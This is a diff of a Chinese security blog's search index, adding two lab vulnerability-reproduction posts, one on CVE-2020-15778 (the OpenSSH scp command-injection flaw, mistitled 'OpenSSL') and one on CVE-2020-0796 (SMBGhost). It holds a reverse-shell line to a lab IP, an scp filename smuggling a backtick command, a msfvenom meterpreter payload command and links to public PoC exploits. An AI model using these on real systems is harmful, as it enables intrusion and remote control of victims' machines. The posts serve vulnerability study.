@@ -1,6 +1,152 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2020-15778 OpenSSL漏洞复现</title>
+    <url>/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p>
+<blockquote>
+<p>OpenSSH &lt;= 8.3p1 </p>
+</blockquote>
+<p><strong>漏洞介绍</strong></p>
+<blockquote>
+<p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p>
+</blockquote>
+<p><strong>局限性</strong></p>
+<blockquote>
+<p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p>
+</blockquote>
+<ol>
+<li><strong>关闭自带防火墙(firewalld)</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">停止firewalld服务 
+$ systemctl stop firewalld
+</code></pre>
+<ol start="2">
+<li><strong>设置iptables策略</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">service iptables start
+iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP
+service iptables save
+iptables -L -n --line-number 
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p>
+<p><strong>验证</strong></p>
+<blockquote>
+<p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p>
+<pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p>
+<p><strong>kali监听6666端口</strong></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p>
+<p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p>
+<p><strong>命令执行，运行1.sh</strong></p>
+<pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
+<p>scp命令源码</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;
+    xasprintf(&bp, "%s -t %s%s", cmd,
+        *targ == '-' ? "-- " : "", targ);
+    if (do_cmd(thost, tuser, tport, bp, &remin,
+        &remout) < 0)
+        exit(1);
+    if (response() < 0)
+        exit(1);
+    free(bp);
+&#125;
+</code></pre>
+<p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
+    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
+<p>SMB远程代码执行漏洞</p>
+<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
+<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
+<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
+</blockquote>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
+Windows 10 Version 1903 for x64-based Systems
+Windows 10 Version 1903 for ARM64-based Systems
+Windows Server, Version 1903 (Server Core installation)
+Windows 10 Version 1909 for 32-bit Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for ARM64-based Systems
+Windows Server, Version 1909 (Server Core installation)
+</code></pre>
+<p><strong>漏洞复现工具下载</strong></p>
+<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
+<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
+<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>将目标机的防火墙关闭</strong></li>
+<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
+<ol start="3">
+<li><strong>利用下载的poc脚本发起攻击</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>生成一个反弹木马</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
+
+   说明: 
+   #-p payload
+   #-e 编码方式
+   #-i 编码次数
+   #-b 过滤坏字符
+   #LHOST,LPORT 监听上线的主机IP和端口
+   #-f python 生成python格式
+   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
+<ol start="2">
+<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
+<ol start="3">
+<li><strong>开启msf监听模块</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
+<ol start="4">
+<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
+<blockquote>
+<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
     <title>PHP代码审计基础概念</title>
     <url>/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
     <content><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ul>
@@ -452,152 +598,6 @@ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;
 <p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210223163853172.png" alt="image-20210223163853172"></p>
 <h4 id="安全加固-16"><a href="#安全加固-16" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
 <p>将nmap版本升级到5.21以上</p>
-</blockquote>
-]]></content>
-  </entry>
-  <entry>
-    <title>CVE-2020-15778 OpenSSL漏洞复现</title>
-    <url>/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p>
-<blockquote>
-<p>OpenSSH &lt;= 8.3p1 </p>
-</blockquote>
-<p><strong>漏洞介绍</strong></p>
-<blockquote>
-<p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p>
-</blockquote>
-<p><strong>局限性</strong></p>
-<blockquote>
-<p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p>
-</blockquote>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
-<p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p>
-</blockquote>
-<ol>
-<li><strong>关闭自带防火墙(firewalld)</strong></li>
-</ol>
-<pre class=" language-shell"><code class="language-shell">停止firewalld服务 
-$ systemctl stop firewalld
-</code></pre>
-<ol start="2">
-<li><strong>设置iptables策略</strong></li>
-</ol>
-<pre class=" language-shell"><code class="language-shell">service iptables start
-iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP
-service iptables save
-iptables -L -n --line-number 
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p>
-<p><strong>验证</strong></p>
-<blockquote>
-<p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p>
-<pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p>
-<p><strong>kali监听6666端口</strong></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p>
-<p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p>
-<p><strong>命令执行，运行1.sh</strong></p>
-<pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
-<p>scp命令源码</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;
-    xasprintf(&bp, "%s -t %s%s", cmd,
-        *targ == '-' ? "-- " : "", targ);
-    if (do_cmd(thost, tuser, tport, bp, &remin,
-        &remout) < 0)
-        exit(1);
-    if (response() < 0)
-        exit(1);
-    free(bp);
-&#125;
-</code></pre>
-<p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
-<p>SMB远程代码执行漏洞</p>
-<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
-<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
-<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
-</blockquote>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
-Windows 10 Version 1903 for x64-based Systems
-Windows 10 Version 1903 for ARM64-based Systems
-Windows Server, Version 1903 (Server Core installation)
-Windows 10 Version 1909 for 32-bit Systems
-Windows 10 Version 1909 for x64-based Systems
-Windows 10 Version 1909 for ARM64-based Systems
-Windows Server, Version 1909 (Server Core installation)
-</code></pre>
-<p><strong>漏洞复现工具下载</strong></p>
-<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
-<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
-<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
-<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>将目标机的防火墙关闭</strong></li>
-<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
-<ol start="3">
-<li><strong>利用下载的poc脚本发起攻击</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>生成一个反弹木马</strong></li>
-</ol>
-<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
-
-   说明: 
-   #-p payload
-   #-e 编码方式
-   #-i 编码次数
-   #-b 过滤坏字符
-   #LHOST,LPORT 监听上线的主机IP和端口
-   #-f python 生成python格式
-   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
-<ol start="2">
-<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
-<ol start="3">
-<li><strong>开启msf监听模块</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
-<ol start="4">
-<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
-<blockquote>
-<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
 </blockquote>
 ]]></content>
   </entry>
